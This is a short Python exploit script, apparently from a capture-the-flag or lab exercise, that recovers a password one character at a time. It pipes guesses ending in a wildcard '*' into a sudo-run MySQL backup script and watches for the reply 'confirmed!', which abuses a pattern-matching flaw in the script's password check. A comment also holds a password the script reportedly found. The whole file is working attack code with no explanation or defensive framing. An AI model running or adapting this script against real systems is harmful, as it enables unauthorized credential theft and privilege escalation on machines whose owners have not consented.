import subprocess
import string

def leak_password():
    pool = string.ascii_letters + string.digits
    cmd = ['sudo', '/opt/scripts/mysql-backup.sh']
    password = '' # found: kljh12k3jhaskjh12kjh3

    while(True):
        for char in pool:
            p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
            guess = f'{password}{char}*'.encode()
            
            out, err = p.communicate(guess)
            
            if(b'confirmed!' in out):
                password = guess[:-1].decode()
                print(f'{password=}')
                break
        else:
            break
            

if __name__ == "__main__":
    leak_password()